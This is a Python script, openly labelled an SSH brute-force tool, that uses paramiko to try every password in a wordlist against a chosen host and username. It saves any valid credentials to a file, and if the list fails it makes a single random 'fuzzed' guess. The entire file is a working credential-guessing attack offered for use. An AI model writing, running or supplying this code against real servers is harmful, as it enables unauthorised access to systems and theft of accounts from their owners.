#!/usr/bin/env python
# -*- coding: utf-8 -*-

import paramiko
import socket
import time
import random
import string
from colorama import init, Fore

init()

GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE

def is_ssh_open(hostname, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        print(f"{RED}[!] Host: {hostname} is unreachable, timeout{RESET}")
        return False
    except paramiko.AuthenticationException:
        print(f"[!] Invalid credentials for {username}:{password}")
        return False
    except paramiko.SSHException:
        print(f"{BLUE}[*] Connection timed out, retry with delay{RESET}")
        time.sleep(60)
        return is_ssh_open(hostname, username, password)
    else:
        print(f"{GREEN}[+] Valid credentials:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}")
        return True

def fuzz_password(length):
    chars = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(chars) for _ in range(length))
    return password

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Python script for SSH Brute Force")
    parser.add_argument("host", help="Hostname or IP Address of the SSH Server")
    parser.add_argument("-P", "--passlist", help="Wordlist *.txt")
    parser.add_argument("-u", "--user", help="Provide the username")
    parser.add_argument("-f", "--fuzz", type=int, help="Password length for fuzzing")

    args = parser.parse_args()
    host = args.host
    passlist = args.passlist
    user = args.user
    fuzz_length = args.fuzz

    #with open(passlist, "r") as f:
        #passlines = f.read().splitlines()

    with open(passlist, "r", encoding="latin-1") as f:
        passlines = f.read().splitlines()

    for password in passlines:
        if is_ssh_open(host, user, password):
            with open("credentials.txt", "w") as f:
                f.write(f"{user}@{host}:{password}")
            break
    else:
        if fuzz_length:
            print(f"{BLUE}[-] No valid credentials found in the list. Performing password fuzzing...")
            fuzzed_password = fuzz_password(fuzz_length)
            print(f"{BLUE}[*] Randomly generated password: {fuzzed_password}")
            if is_ssh_open(host, user, fuzzed_password):
                with open("credentials.txt", "w") as f:
                    f.write(f"{user}@{host}:{fuzzed_password}")
            else:
                print(f"{RED}[-] No valid credentials found. Try with a more comprehensive password list.")
        else:
            print(f"{RED}[-] No valid credentials found in the list, and no password length provided for fuzzing.")
